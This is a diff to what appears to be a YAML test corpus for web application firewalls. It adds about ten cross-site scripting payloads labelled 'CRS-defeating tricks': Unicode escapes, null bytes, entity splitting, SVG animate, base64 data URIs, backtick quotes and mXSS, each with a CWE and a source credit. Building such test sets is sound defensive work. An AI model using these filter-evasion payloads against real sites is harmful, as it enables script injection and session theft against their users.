@@ -185,3 +185,85 @@
   trigger: { kind: reflected, marker: "jav&#x09;ascript" }
   cwe: CWE-79
   source: "OWASP cheat-sheet — tab-split scheme"
+
+# ==== Phase-7 additions: CRS-defeating tricks ====
+
+# Unicode/UTF escapes inside the tag name or handler — libinjection's tag
+# tokeniser treats these as literal chars post-decode.
+- id: xss-unicode-001
+  class: xss
+  payload: "<marquee onstart=\\u0070\\u0072\\u006f\\u006d\\u0070\\u0074()>x"
+  trigger: { kind: reflected, marker: "onstart" }
+  cwe: CWE-79
+  source: "WAF-Bypass repo — Unicode handler"
+
+- id: xss-unicode-002
+  class: xss
+  payload: "<scr\u0131pt>alert(1)</scr\u0131pt>"        # dotless i
+  trigger: { kind: reflected, marker: "alert(1)" }
+  cwe: CWE-79
+  source: "jlajara — Unicode compatibility XSS"
+
+# HTML-entity variant that preserves intent through CRS tokeniser
+- id: xss-entity-001
+  class: xss
+  payload: "<img src=x &#111;nerror=alert(1)>"
+  trigger: { kind: reflected, marker: "onerror" }
+  cwe: CWE-79
+  source: "OWASP — numeric entity attribute split"
+
+# Null-byte splitter on script tag
+- id: xss-nullbyte-001
+  class: xss
+  payload: "<scri\u0000pt>alert(1)</scri\u0000pt>"
+  trigger: { kind: reflected, marker: "alert(1)" }
+  cwe: CWE-79
+  source: "PayloadsAllTheThings — null byte"
+
+# SVG animate (less-common vector, some CRS versions skip SVG event handlers)
+- id: xss-svg-animate
+  class: xss
+  payload: "<svg><animate attributeName=href values=javascript:alert(1) /></svg>"
+  trigger: { kind: reflected, marker: "animate" }
+  cwe: CWE-79
+  source: "HTML5 security cheat-sheet — SVG animate"
+
+# Base64 data-URI in iframe — often slips past pattern WAFs
+- id: xss-data-b64
+  class: xss
+  payload: "<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==></iframe>"
+  trigger: { kind: reflected, marker: "data:text/html;base64" }
+  cwe: CWE-79
+  source: "WAF-Bypass repo — data URI"
+
+# CSS expression leak (older IE vector, still in many corpora)
+- id: xss-css-001
+  class: xss
+  payload: "<style>@import'javascript:alert(1)';</style>"
+  trigger: { kind: reflected, marker: "@import" }
+  cwe: CWE-79
+  source: "OWASP — CSS @import XSS"
+
+# Template-style with mixed quotes
+- id: xss-template-001
+  class: xss
+  payload: "<img src=`x`onerror=`alert(1)`>"
+  trigger: { kind: reflected, marker: "onerror=" }
+  cwe: CWE-79
+  source: "Gareth Heyes — backtick attribute quotes"
+
+# Protocol-handler obfuscation
+- id: xss-proto-001
+  class: xss
+  payload: "<a href=\"\\tjavascript:alert(1)\">x</a>"    # embedded tab
+  trigger: { kind: reflected, marker: "javascript" }
+  cwe: CWE-79
+  source: "Whitespace-before-proto evasion"
+
+# mXSS-flavoured (re-parse in noscript/textarea)
+- id: xss-mxss-001
+  class: xss
+  payload: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+  trigger: { kind: reflected, marker: "onerror=alert(1)" }
+  cwe: CWE-79
+  source: "Cure53 mXSS catalogue"
